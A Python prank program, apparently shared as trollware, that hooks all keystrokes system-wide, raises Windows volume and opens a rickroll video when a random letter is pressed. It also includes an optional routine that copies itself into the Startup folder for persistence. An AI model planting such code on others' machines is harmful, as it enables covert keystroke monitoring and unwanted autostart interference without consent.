# By sug023
# THIS SCRIPT HAS BEEN CREATED FOR INFORMATIONAL AND EDUCATIONAL PURPOSES ONLY. I AM NOT RESPONSIBLE FOR ANY CONSEQUENCES. USE IT AT YOUR OWN RISK.

import random
import webbrowser
from threading import Timer
from pynput import keyboard  # type: ignore
import os
import sys
import shutil
import ctypes

try:
    import winshell
except Exception:
    winshell = None

# Windows message constants for volume control
HWND_BROADCAST = 0xFFFF
WM_APPCOMMAND = 0x319
APPCOMMAND_VOLUME_UP = 0x0a

def increase_volume_step():
    """
    Increase system volume by approximately 2% per call.
    Uses Windows API through ctypes.
    """
    ctypes.windll.user32.PostMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, APPCOMMAND_VOLUME_UP << 16)


class KBTroller:
    """
    Simple keyboard-triggered URL opener with optional volume control and persistence.
    Intended for educational or testing purposes.
    """

    def __init__(self, url: str = "", vol: bool = False, persistence: bool = False, debug: bool = True):
        self.url = url
        self.vol = bool(vol)
        self.persistence = bool(persistence)
        self.debug = bool(debug)
        self.kb = list("abcdefghijklmnñopqrstuvwxyz")
        self.letter = self.get_letter()
        self._debounce = False  # Prevent multiple triggers on a single key press

    def get_letter(self):
        """Randomly select a target letter for triggering actions."""
        letter = random.choice(self.kb)
        if self.debug:
            print(f"[DEBUG] New target letter: {letter}")
        return letter

    def open_url(self):
        """Open the configured URL in the default web browser."""
        if not self.url:
            if self.debug:
                print("[DEBUG] Empty URL: nothing will be opened.")
            return
        webbrowser.open(self.url, new=2)
        if self.debug:
            print(f"[DEBUG] Opening URL: {self.url}")

    def _reset_debounce(self):
        """Reset the debounce flag to allow the next trigger."""
        self._debounce = False

    def _on_press(self, key):
        """Handle key press events."""
        try:
            char = key.char.lower()
        except AttributeError:
            return  # Ignore non-character keys

        if self.debug:
            print(f"[DEBUG] Key pressed: {char}")

        if char == self.letter and not self._debounce:
            if self.debug:
                print(f"[DEBUG] Correct letter '{char}' pressed. Executing actions.")
            if self.vol:
                self.set_volume_max()

            self.open_url()
            self.letter = self.get_letter()

            self._debounce = True
            Timer(1.0, self._reset_debounce).start()

    def on_release(self, key):
        """Optional key release handler (not used)."""
        pass

    def set_volume_max(self):
        """
        Increase system volume using multiple steps.
        Each call increases volume by approximately 2%.
        """
        try:
            for _ in range(10):  # Raise volume by ~20% total
                increase_volume_step()
            if self.debug:
                print("[DEBUG] Volume increased multiple steps.")
            return True
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Error increasing volume: {e}")
            return False

    def add_to_startup(self):
        """
        Copy the script or executable to Windows Startup folder for persistence.
        Only works if winshell is available.
        """
        if winshell is None:
            if self.debug:
                print("[DEBUG] winshell not available; cannot add to startup.")
            return False

        current_file = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

        try:
            startup_folder = winshell.startup()
            destination = os.path.join(startup_folder, os.path.basename(current_file))
            if os.path.exists(destination):
                if self.debug:
                    print(f"[DEBUG] Already exists in Startup: {destination}")
                return True
            shutil.copy(current_file, destination)
            if self.debug:
                print(f"[DEBUG] Copied to Startup: {destination}")
            return True
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Error copying to Startup: {e}")
            return False

    def run(self):
        """Start listening for keyboard events and handle triggers."""
        if self.persistence:
            if self.debug:
                print("[DEBUG] persistence=True -> attempting to add to Startup")
            self.add_to_startup()

        if self.debug:
            print(f"[DEBUG] Listening... press the letter '{self.letter}' (Vol={'ON' if self.vol else 'OFF'}, Persistence={'ON' if self.persistence else 'OFF'})")
        else:
            print(f"Listening... press the letter '{self.letter}'")

        with keyboard.Listener(on_press=self._on_press, on_release=self.on_release) as listener:
            listener.join()


# Example usage: a "rickroll" trigger with volume and optional persistence
kb = KBTroller(
    url="https://ia801502.us.archive.org/27/items/y-2-mate.is-rick-astley-never-gonna-give-you-up-remastered-4-k-60fps-ai-o-ybdtq-/Y2Mate.is%20-%20Rick%20Astley%20-%20Never%20Gonna%20Give%20You%20Up%20%28Remastered%204K%2060fps%2CAI%29-o-YBDTqX_ZU-1080p-1658021729392.mp4",
    vol=True,
    persistence=False,
    debug=False
)
kb.run()
